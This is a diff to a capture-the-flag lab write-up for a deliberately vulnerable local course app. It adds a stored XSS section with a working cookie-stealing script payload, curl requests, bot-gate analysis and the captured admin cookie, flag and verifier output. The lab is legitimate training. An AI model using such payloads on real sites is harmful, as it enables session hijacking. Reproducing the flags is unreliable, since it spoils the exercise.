@@ -11,13 +11,13 @@ touched.
 
 A note on the em dash rule, since a reader grepping this file will find them.
 Where an em dash appears inside a quoted response block it is the target's own
-output, copied byte for byte. The app's templates render message titles as
-`#<id> — <title>` (`messages.html:6`, `message_detail.html:5`), so any faithful
-capture of those pages contains one. Those are evidence, and altering them would
-make the record inaccurate, so they are preserved as received. No em dash
-appears in the prose of this file.
+output, copied byte for byte. The app's templates render each message title with
+the id, then a dash character, then the title (`messages.html:6`,
+`message_detail.html:5`), so any faithful capture of those pages contains one.
+Those are evidence, and altering them would make the record inaccurate, so they
+are preserved as received. No em dash appears in the prose of this file.
 
-Status: 2 of 6 captured (sqli, idor). The other four are not yet worked.
+Status: 3 of 6 captured (sqli, idor, xss). The other three are not yet worked.
 
 ---
 
@@ -389,6 +389,248 @@ FLAG{sqli_0883918f1b72}  VALID (sqli)
 FLAG{idor_c143bbc0c939}  VALID (idor)
 
 2/6 flags valid for username s_hart
+```
+
+No entry was made in `attempts.md`: the challenge was captured on the first
+attempt.
+
+---
+
+## 3. xss: stored cross-site scripting in the guestbook
+
+**Flag:** `FLAG{xss_bef03a753643}`
+**Captured:** 2026-09-29
+**Verified:** `verify.py` exit 1 with `3/6 valid` and the line
+`FLAG{xss_bef03a753643}  VALID (xss)`. Exit 1 is expected while three
+challenges remain.
+
+### The vulnerability
+
+The comment body is bound as a parameter into the insert
+(`app.py:280` to `app.py:282`), so the database layer is not the problem: the
+value is stored exactly as submitted. The defect is on the way out.
+`guestbook.html:17` renders the body with `| safe`, which switches Jinja's
+autoescape off for that one expression, so stored HTML is emitted into the page
+as markup. It is the only `| safe` in the templates, and
+`guestbook.html:16` carries a comment naming it as the planted bug.
+
+No authentication is required to plant a payload. The author is taken from the
+session if there is one and set to the literal `anonymous` otherwise
+(`app.py:277`), so an unauthenticated visitor can write a comment that every
+later visitor executes.
+
+The flag is not in the page. It exists only as the value in the bot's own cookie
+(`app.py:360`), so the payload has to make the bot deliver it somewhere the
+student can read it. That is what makes this challenge a two-part problem: the
+script must be stored, and it must also satisfy the bot's matching rules.
+
+### Step 1: plant the payload, with no session
+
+Literal request, deliberately without a cookie jar:
+
+```
+curl -s -i -X POST http://127.0.0.1:5000/guestbook \
+  --data-urlencode "comment=<script>fetch('/grab?'+document.cookie)</script>"
+```
+
+The decoded value of the `comment` field is:
+
+```
+<script>fetch('/grab?'+document.cookie)</script>
+```
+
+Response:
+
+```
+HTTP/1.1 302 FOUND
+Location: /guestbook
+```
+
+The 302 is the handler's redirect back to the guestbook after a successful
+insert (`app.py:284`). No credential was supplied at any point in this
+challenge.
+
+### Step 2: the payload is stored and served as markup
+
+This step proves the XSS on its own, before the bot is involved. Literal
+request:
+
+```
+curl -s http://127.0.0.1:5000/guestbook
+```
+
+Literal response, the comment block:
+
+```
+<div class="comments">
+
+    <div class="comment">
+      <span class="author">admin</span>:
+
+      <span class="text">Welcome to the guestbook!</span>
+    </div>
+
+    <div class="comment">
+      <span class="author">anonymous</span>:
+
+      <span class="text"><script>fetch('/grab?'+document.cookie)</script></span>
+    </div>
+
+</div>
+```
+
+The `<script>` tag is present in the served HTML as a tag, not as text. With
+autoescape in force it would have been emitted as `&lt;script&gt;` and the
+browser would have shown it as characters. Note also that the author renders as
+`anonymous`, which is the `app.py:277` fallback and confirms the write was
+unauthenticated.
+
+### Step 3: why this exact payload
+
+The bot imposes three conditions before it will act on a comment. Each one is
+visible in the source, and the payload was built to satisfy all three.
+
+| Gate | Source | Requirement | How this payload meets it |
+|---|---|---|---|
+| Keyword gate | `app.py:376` | the lowercased body must contain `<script` **and** `document.cookie` | contains both literally |
+| Sink gate | `app.py:379` to `app.py:381` | a quoted URL immediately after `fetch(`, `.src=`, `location=` or `open(` | `fetch('/grab?'` matches the first alternative |
+| Fallback gate | `app.py:384` | only used if the sink gate fails: any quoted string starting with `/` | not reached, listed here because a payload relying on it must quote a leading slash |
+
+`fetch(` was chosen over the other three sinks because it is the first
+alternative in the regex and needs no attribute context.
+
+Replaying the bot's own gate and regex against the payload confirms what it
+extracted:
+
+```
+has <script      : True
+has document.cookie: True
+sink regex group1 : '/grab?'
+before host fixup : /grab?session%3Dadmin%3B%20flag%3DFLAG%7Bxss_bef03a753643%7D
+bot requests      : http://127.0.0.1:5000/grab?session%3Dadmin%3B%20flag%3DFLAG%7Bxss_bef03a753643%7D
+grab unquotes to  : session=admin; flag=FLAG{xss_bef03a753643}
+```
+
+So the regex captures `/grab?` as the target. The bot then appends its cookie,
+percent-encoded, with no separator character (`app.py:390`), which is why the
+payload's URL ends in `?` and needs no `&`. Because the resulting string starts
+with `/`, the bot prefixes the local host and port (`app.py:391` to
+`app.py:392`) and requests it (`app.py:394`). The payload works because `/grab`
+reads the entire query string rather than a named parameter (`app.py:299`), so
+the cookie appended after the `?` is captured wholesale.
+
+### Step 4: the bot fires and the flag is delivered
+
+The bot polls every two seconds (`app.py:397`). Literal request:
+
+```
+curl -s http://127.0.0.1:5000/grab
+```
+
+Literal response, complete body:
+
+```
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Vuln Hub — INF601 Practice Target</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+  <header>
+    <a href="/" class="brand">Vuln Hub</a>
+    <nav>
+      <a href="/">Home</a>
+      <a href="/login">Login</a>
+      <a href="/messages">Messages</a>
+      <a href="/guestbook">Guestbook</a>
+      <a href="/download?file=welcome.txt">Downloads</a>
+
+    </nav>
+  </header>
+
+  <main>
+
+<h1>Collected data</h1>
+<p class="hint">This endpoint records anything sent to it as a query string. If your
+stored-XSS payload fired in the admin's browser, whatever it sent shows up here.</p>
+
+  <ul>
+    <li><code>session=admin; flag=FLAG{xss_bef03a753643}</code></li>
+  </ul>
+
+  </main>
+```
+
+The captured string is `session=admin; flag=FLAG{xss_bef03a753643}`, which is the
+bot's cookie after URL-decoding (`app.py:302`).
+
+Two details in that response are worth pointing at:
+
+- The nav bar contains no `Logout (...)` link, which `base.html:17` renders only
+  when `user` is set. This request carried no cookie, so the exfiltration sink is
+  readable by anyone. A payload does not need a session to collect its own loot.
+- The captured value begins `session=admin`, which is the first field of the
+  bot's cookie (`app.py:360`). Nothing in this PoC ever sent that string. The
+  only party that could have supplied it is the bot, which is what demonstrates
+  the script executed with the bot's cookie rather than merely being stored.
+
+### The evidence chain
+
+| Source line | Behaviour it specifies | Observed in the responses above |
+|---|---|---|
+| `app.py:277` | author falls back to `anonymous` with no session | the comment renders as `anonymous` |
+| `guestbook.html:17` | body emitted unescaped | raw `<script>` tag in the served HTML |
+| `app.py:376` | both keywords required | replay confirms both present |
+| `app.py:379` to `app.py:381` | URL taken from a quoted sink | replay captures `/grab?` |
+| `app.py:390` | cookie appended with no separator | capture contains the cookie immediately after the query string |
+| `app.py:391` to `app.py:392` | relative target gets the local host | capture arrived at `/grab`, which is local |
+| `app.py:302` | query string stored URL-decoded | capture reads `session=admin; flag=...`, not percent-encoded |
+
+The reconstruction in step 3 produces the captured string byte for byte, which is
+what ties the payload to the flag. The flag is not in the guestbook page and not
+in any page the attacker can read directly.
+
+### Notes and limits
+
+- **One attempt per process lifetime.** `seen` starts as `{1}` (`app.py:359`)
+  and every processed id is added to it (`app.py:373`), so each comment is acted
+  on once and reposting the same payload is pointless. A failed payload is
+  recovered by restarting the app, which wipes the database and forgets `seen`
+  (`app.py:407`, `app.py:105` to `app.py:107`). This was not needed: the payload
+  worked on the first post, and no restart was performed.
+- **The bot's outbound request is not logged** by the app, so the exact URL it
+  requested is reconstructed from the source plus the capture rather than
+  observed in a log. What is observed is the string at `/grab`, and the
+  reconstruction matches it exactly.
+- **`CAPTURES` is in memory** (`app.py:294`) and process-global, so restarting
+  the app clears the evidence page as well as the comments. The capture above was
+  read from the same process that received it.
+- **The author field is not a route to the flag.** `guestbook.html:15` renders
+  `{{ row.author }}` without `| safe`, and the author is taken from the session
+  rather than the form (`app.py:277`), so it is neither attacker-supplied in the
+  useful sense nor unescaped. The body is the only injection point here.
+- The value of `FLAG_SEED` used was `s_hart`, and the flag was accepted by
+  `verify.py` for `--username s_hart`.
+
+### Result
+
+Appended to `submission.txt`:
+
+```
+FLAG{xss_bef03a753643}
+```
+
+Verifier output:
+
+```
+verify: 3/6 valid. Still missing: authz, traversal, exposure
+FLAG{sqli_0883918f1b72}  VALID (sqli)
+FLAG{idor_c143bbc0c939}  VALID (idor)
+FLAG{xss_bef03a753643}  VALID (xss)
+
+3/6 flags valid for username s_hart
 ```
 
 No entry was made in `attempts.md`: the challenge was captured on the first
